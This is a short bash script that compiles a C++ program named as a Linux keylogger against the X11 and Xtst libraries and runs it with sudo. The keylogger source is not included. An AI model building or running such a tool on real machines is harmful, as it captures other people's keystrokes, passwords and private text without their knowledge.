#!/bin/bash
# Build and run script for Linux

# Compile the Linux keylogger
g++ -o keylogger_linux keylogger_linux.cpp -I../include -lX11 -lXtst

# Run the keylogger
sudo ./keylogger_linux
